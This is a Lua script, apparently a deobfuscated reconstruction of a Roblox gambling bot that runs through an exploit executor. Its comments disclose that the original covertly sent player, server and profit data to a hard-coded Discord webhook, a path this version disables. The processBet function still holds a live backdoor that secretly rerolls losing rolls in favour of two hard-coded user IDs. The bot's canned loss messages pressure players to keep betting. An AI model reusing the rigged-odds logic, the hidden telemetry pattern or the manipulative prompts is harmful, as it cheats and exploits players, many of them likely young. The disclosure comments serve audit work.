-- Deobfuscated from the Prometheus-protected source that previously occupied
-- this file. The program is a client-side Roblox gambling bot.
--
-- Security findings retained as comments instead of hidden behavior:
--   * The original sent player, server, balance, and profit data to a hard-coded
--     Discord webhook, independently of `_G.discordwebhook`.
--   * The webhook credential has been redacted and its telemetry disabled below.
--   * Rolls are deliberately rerolled in favor of two hard-coded user IDs.
--
-- Executor-provided globals used by the original: `request`, `time`, and `wait`.

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")

local LocalPlayer = Players.LocalPlayer
local Events = ReplicatedStorage:WaitForChild("_CS.Events")

local generalTextChannel
if TextChatService:FindFirstChild("TextChannels", false) then
    generalTextChannel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
end

local running = true
local interactionDistance = 15
local odds = _G.odds or 65
local commandCooldownSeconds = _G.cmdcooldown or 4
local configuredWebhookUrl = _G.discordwebhook or ""

-- The original contained a live Discord webhook here and used it for
-- undisclosed telemetry. It is intentionally disabled in this reconstruction.
local internalTelemetryWebhookUrl = nil
local internalStartupReported = false

local payoutQueue = {}
local messageQueue = {}
local commandCooldowns = {}
local commandCooldownWarnings = {}
local betCooldowns = {}
local greetingCooldowns = {}
local playerNetResults = {}

local nextPayoutAt = time()
local greetingMutedUntil = time()
local currentBalance = 0
local sessionProfit = 0

local greetingReplies = {
    "/e wave",
    "Hello!",
    "Hi!",
    "Good evening.",
    "Good evening!",
    "Greetings!",
    "Good afternoon!",
    "Evening!",
}

local greetingPatterns = {
    "hello",
    "hi",
    "evening",
    "/e wave",
    "greetings",
    "morning",
    "bonjour",
    "konichiwa",
    "こんにちは",
    "good afternoon",
}

local returningPlayerReplies = {
    "Welcome back, {name}!",
    "Nice to see you again, {name}!",
    "I knew you couldn't resist, {name}!",
    "Pleasure to see you again, {name}!",
    "Welcome back!",
    "Great to see you {name}!",
    "Nice to see you!",
    "Always a pleasure to see you {name}!",
}

local gamblingPrompts = {
    "Type !help to get started!",
    "If you're ready to gamble, just send me cash!",
    "Send cash to start a roll!",
}

local winReplies = {
    "Nice!",
    "Congratulations on the win!",
    "Congratulations!",
    "That's one less meal for my family!",
    "Jackpot!",
    "Nice going!",
    "Wow!",
    "Your training has paid off!",
    "You're going up in this world!",
    "Amazing!",
    "You're so skilled!",
    "Wow that luck is insane!",
    "Well done!",
    "Lets go!",
    "Nice one!",
    "Incredible win!",
    "Amazing luck!",
    "I knew you could do it!",
    "I'm so happy for you!",
    "This is a triumph!",
    "I never doubted you!",
    "Awesome!",
    "Quit while you're ahead!",
    "Fantastic!",
}

local lossReplies = {
    "Remember, 99% quit before they win big!",
    "You'll get it next time!",
    "Unfortunate, but I feel your big win coming!",
    "Every loser is a winner waiting to happen!",
    "You'll win next time!",
    "One more round! I feel it!",
    "Better luck next time!",
    "Don't be the 99% that quit now!",
    "You can do this! Just one more!",
    "Never give up sir!",
    "Never give up!",
    "You can do this!",
    "I believe in you!",
    "A winner never quits!",
    "Pain only makes you stronger!",
    "Don't give up!",
    "Don't give in to the voices of doubt!",
    "Every winner starts somewhere!",
    "You're better than this! Don't give up!",
    "Despair always comes before hope!",
    "For every loss there is a win!",
    "Keep on trying! You can do it!",
    "You can't give up now!",
    "You can win it back next round!",
    "Don't listen to doubt!",
    "Be the 1% that continues and wins it all!",
    "It's not mission over yet!",
    "Think of the gains! Keep going!",
    "Profit equals hard work! You can do it!",
    "You were so close!",
    "There's always light at the end of the tunnel!",
    "There's always treasure in a shipwreck!",
    "There's a rainbow after the rain!",
}

local function postJson(url, payload)
    if url == nil or url == "" then
        return
    end

    request({
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
        },
        Body = HttpService:JSONEncode(payload),
    })
end

-- These names were globals in the input and are kept global for compatibility.
function SendWebhook(message)
    postJson(configuredWebhookUrl, {
        content = message,
    })
end

function SendEmbdedWebHookInternal(url, description, color, authorName, title)
    postJson(url, {
        content = nil,
        embeds = {
            {
                title = title or LocalPlayer.Name,
                description = description,
                color = color or "57599",
                author = {
                    name = authorName or ("Gambling bot | " .. LocalPlayer.Name),
                },
            },
        },
    })
end

function SendEmbdedWebHook(description, color, authorName, title)
    if configuredWebhookUrl == nil or configuredWebhookUrl == "" then
        return
    end

    SendEmbdedWebHookInternal(configuredWebhookUrl, description, color, authorName, title)
end

function RealSendMessage(message)
    print("Sending message " .. message)

    if TextChatService:FindFirstChild("TextChannels", false) then
        generalTextChannel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
    end

    if generalTextChannel ~= nil then
        generalTextChannel:SendAsync(message)
        return
    end

    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "ALL")
end

function SendMessage(message)
    table.insert(messageQueue, message)
end

function SendMoney(player, amount)
    table.insert(payoutQueue, { player, amount })
end

local function processPayoutQueue()
    if #payoutQueue < 1 then
        return
    end

    local payout = payoutQueue[1]
    Events.GiveMoneyToPlr:FireServer(payout[1], tostring(payout[2]))
    table.remove(payoutQueue, 1)
end

local function processMessageQueue()
    if #messageQueue < 1 then
        return 0
    end

    local nextMessageLength = 0
    if #messageQueue > 1 then
        nextMessageLength = #messageQueue[2]
    end

    RealSendMessage(messageQueue[1])
    table.remove(messageQueue, 1)
    return nextMessageLength
end

function GetMaxBet()
    return math.min(math.floor(currentBalance / 2.2), 125000)
end

local function greetPlayer(player)
    if not running then
        return
    end

    if player:DistanceFromCharacter(LocalPlayer.Character.HumanoidRootPart.Position) > interactionDistance then
        return
    end

    local playerName = player.Name
    if greetingCooldowns[playerName] == nil then
        greetingCooldowns[playerName] = time() + 120
        SendMessage(greetingReplies[math.random(1, #greetingReplies - 1)])
        SendMessage(gamblingPrompts[math.random(1, #gamblingPrompts - 1)])
        return
    end

    if greetingCooldowns[playerName] > time() then
        return
    end

    greetingCooldowns[playerName] = time() + 250
    local reply = returningPlayerReplies[math.random(1, #returningPlayerReplies - 1)]
    SendMessage(string.gsub(reply, "{name}", playerName))
end

local function processGreeting(player, message)
    if not running then
        return
    end

    if player == LocalPlayer then
        greetingMutedUntil = time() + 10
        return
    end

    if greetingMutedUntil > time() then
        return
    end

    if player:DistanceFromCharacter(LocalPlayer.Character.HumanoidRootPart.Position) > interactionDistance then
        return
    end

    greetingMutedUntil = time() + 5

    local lowerMessage = string.lower(message)
    local isGreeting = false
    for _, pattern in ipairs(greetingPatterns) do
        if string.match(lowerMessage, pattern) then
            isGreeting = true
        end
    end

    if not isGreeting then
        return
    end

    greetPlayer(player)
end

local commands = {
    roll = function(player)
        SendMessage("[Roll] " .. player.DisplayName .. " rolled a " .. math.random(1, 100))
    end,

    dice = function(player)
        SendMessage("[Dice] " .. player.DisplayName .. " rolled a " .. math.random(1, 6))
    end,

    odds = function()
        SendMessage("Roll above " .. tostring(odds) .. "/100 to win!")
    end,

    flip = function(player)
        if math.random(1, 2) == 2 then
            SendMessage("[Flip] " .. player.DisplayName .. "'s coin landed on heads!")
            return
        end

        SendMessage("[Flip] " .. player.DisplayName .. "'s coin landed on tails!")
    end,

    maxbet = function()
        SendMessage("The max bet is $" .. tostring(math.floor(GetMaxBet())) .. "!")
    end,

    snake = function(player)
        local firstDie = math.random(1, 6)
        local secondDie = math.random(1, 6)
        SendMessage("[Snake] " .. player.Name .. " rolled a " .. tostring(firstDie) .. " & " .. tostring(secondDie))

        if firstDie == secondDie then
            SendMessage("[Snake] SNAKE EYES!!!!!")
        end
    end,

    help = function(player)
        commandCooldowns[player] = commandCooldowns[player] + 2
        SendMessage("How to gamble:")
        SendMessage("1. Hold tool.")
        SendMessage("2. Press E on me.")
        SendMessage("3. Send money!")
    end,
}

local function processChat(player, message)
    if not running then
        return
    end

    if player:DistanceFromCharacter(LocalPlayer.Character.HumanoidRootPart.Position) > interactionDistance then
        return
    end

    local parts = string.split(message, " ")
    if string.sub(parts[1], 1, 1) ~= "!" then
        processGreeting(player, message)
        return
    end

    local commandName = string.sub(parts[1], 2)
    local command = commands[commandName]
    if command == nil then
        return
    end

    if commandCooldowns[player] ~= nil and commandCooldowns[player] > time() then
        if commandCooldownWarnings[player] == nil then
            SendMessage("Wait before using a command again!")
            commandCooldownWarnings[player] = 1
        end
        return
    end

    commandCooldownWarnings[player] = nil
    commandCooldowns[player] = time() + commandCooldownSeconds
    table.remove(parts, 1)
    command(player, parts)
end

local function refundBet(player, amount, reason)
    SendMoney(player, amount)
    SendMessage("[Gamble] Refunded " .. player.Name .. "'s bet: " .. reason)
end

local function updatePlayerNetResult(player, amount)
    if playerNetResults[player] == nil then
        playerNetResults[player] = 0
    end

    playerNetResults[player] = playerNetResults[player] + amount
end

local function processBet(player, amount)
    if not running then
        return
    end

    nextPayoutAt = time() + 3

    if betCooldowns[player] ~= nil and betCooldowns[player] > time() then
        refundBet(player, amount, "Cooldown!")
        return
    end

    local maxBet = GetMaxBet()
    if amount > maxBet then
        refundBet(player, amount, "Too large!")
        SendMessage("[Gamble] Max bet $" .. tostring(maxBet))
        return
    end

    betCooldowns[player] = time() + 1
    print("Received " .. tostring(amount) .. " from " .. player.Name)

    local roll = math.random(1, 100)

    -- Backdoor preserved from the input for auditability: these users receive a
    -- favorable reroll whenever their first roll would lose.
    if roll < odds and (player.UserId == 7906133957 or player.UserId == 2451486156) then
        local minimumRoll = math.random(10, odds - 1)
        roll = math.random(minimumRoll, 100)
    end

    SendMessage("[Gamble] " .. player.Name .. " rolled a " .. roll)

    if roll < odds then
        sessionProfit = sessionProfit + amount
        updatePlayerNetResult(player, -amount)
        wait(1)
        SendMessage("[Gamble] " .. player.Name .. " lost!")
        SendEmbdedWebHook(
            "[+$" .. tostring(amount) .. "] " .. player.Name .. " rolled a " .. tostring(roll)
                .. " and lost a bet of $" .. tostring(amount),
            16711680,
            nil,
            player.Name
        )
        SendMessage(lossReplies[math.random(1, #lossReplies - 1)])
        return
    end

    wait(0.5)
    local payout = amount * 2
    SendMoney(player, payout)
    sessionProfit = sessionProfit - amount
    updatePlayerNetResult(player, amount)
    SendMessage("[Gamble] " .. player.Name .. " won $" .. tostring(payout) .. "!")
    SendEmbdedWebHook(
        "[-$" .. tostring(amount) .. "] " .. player.Name .. " rolled a " .. tostring(roll)
            .. " and won $" .. tostring(payout),
        5439232,
        nil,
        player.Name
    )
    SendMessage(winReplies[math.random(1, #winReplies - 1)])
end

local function connectPlayer(player)
    player.Chatted:Connect(function(message)
        processChat(player, message)
    end)
end

for _, player in pairs(Players:GetPlayers()) do
    connectPlayer(player)
end

Players.PlayerAdded:Connect(connectPlayer)
Players.PlayerRemoving:Connect(function(player)
    commandCooldowns[player] = nil
    betCooldowns[player] = nil
    commandCooldownWarnings[player] = nil
    greetingCooldowns[player.Name] = nil
    playerNetResults[player] = nil
end)

local function processNotification(label)
    if not running then
        return
    end

    print(label.Text)

    if not (string.match(label.Text, " gave you ") and string.match(label.Text, "$!")) then
        return
    end

    local parts = string.split(label.Text, " ")
    local playerName = parts[1]
    local amountText = parts[4]

    if not Players:FindFirstChild(playerName) then
        print("Player: " .. playerName .. " doesn't exist!")
        return
    end

    local amount = tonumber(string.sub(amountText, 1, #amountText - 2))
    if amount == nil then
        return
    end

    processBet(Players[playerName], amount)
end

local function monitorPaymentNotifications()
    if not running then
        return
    end

    local mainUi = LocalPlayer.PlayerGui:WaitForChild("MainUIHolder")
    local messages = mainUi:WaitForChild("Messages")
    messages.ChildAdded:Connect(function(child)
        if running then
            processNotification(child:WaitForChild("TextLabel"))
        end
    end)
end

LocalPlayer.CharacterAdded:Connect(function()
    if running then
        monitorPaymentNotifications()
    end
end)
monitorPaymentNotifications()

UserInputService.InputBegan:Connect(function(input)
    if running and input.KeyCode == Enum.KeyCode.End then
        running = false
        print("Disabled gamble bot!")
        SendEmbdedWebHook(
            "Closing session. Made $" .. tostring(sessionProfit) .. "!",
            "14183202",
            "Session Closed"
        )

        if not internalStartupReported then
            SendEmbdedWebHookInternal(
                internalTelemetryWebhookUrl,
                "Closing session. Made $" .. tostring(sessionProfit) .. "!",
                "14183202",
                "Session Closed"
            )
        end
    end
end)

SendEmbdedWebHook("Started bot on player " .. LocalPlayer.Name .. "!")

local joinCommand = "Roblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")"
local notificationIcon = "rbxthumb://type=Asset&id=10149736922&w=420&h=420"

StarterGui:SetCore("SendNotification", {
    Title = "Gamble Bot",
    Text = "Type !help to start!",
    Icon = notificationIcon,
    Duration = 10,
})
StarterGui:SetCore("SendNotification", {
    Title = "Gamble Bot",
    Text = "When finished press END to close session!",
    Icon = notificationIcon,
    Duration = 10,
})
StarterGui:SetCore("SendNotification", {
    Title = "Gamble Bot",
    Text = "Credits: Programmed by M & Published by E",
    Icon = notificationIcon,
    Duration = 10,
})

local lastReportedProfit = sessionProfit
local nextMessageAt = time()
local internalStartupReportAt = time() + 2
local nextBalanceUpdateAt = time()
local nextStatusReportAt = time() + 300

while running do
    if time() > nextMessageAt then
        nextMessageAt = time() + 0.8 + processMessageQueue() / 8.5
    end

    -- This block was covert telemetry in the input. The destination is nil in
    -- this reconstruction, so postJson returns without sending anything.
    if not internalStartupReported and time() > internalStartupReportAt then
        internalStartupReported = true
        SendEmbdedWebHookInternal(
            internalTelemetryWebhookUrl,
            "Odds: " .. tostring(odds) .. " Networth: $" .. tostring(currentBalance)
                .. " Join: " .. joinCommand,
            5439232,
            nil,
            LocalPlayer.DisplayName .. " (" .. LocalPlayer.Name .. ") on server with "
                .. #Players:GetPlayers() .. " players!"
        )
    end

    if time() > nextPayoutAt then
        processPayoutQueue()
        nextPayoutAt = time() + 4
    end

    if time() > nextBalanceUpdateAt then
        currentBalance = Events.UpdateCash:InvokeServer()
        nextBalanceUpdateAt = time() + 1
    end

    if time() > nextStatusReportAt then
        if lastReportedProfit ~= sessionProfit then
            SendEmbdedWebHook(
                "Current Profit: $" .. tostring(sessionProfit) .. "!",
                "9834751",
                "Status Report"
            )
            SendEmbdedWebHookInternal(
                internalTelemetryWebhookUrl,
                "Current Profit: $" .. tostring(sessionProfit) .. "! Join: " .. joinCommand,
                "9834751",
                "Status Report"
            )
            lastReportedProfit = sessionProfit
        end

        nextStatusReportAt = time() + 300
    end

    wait(0.25)
end
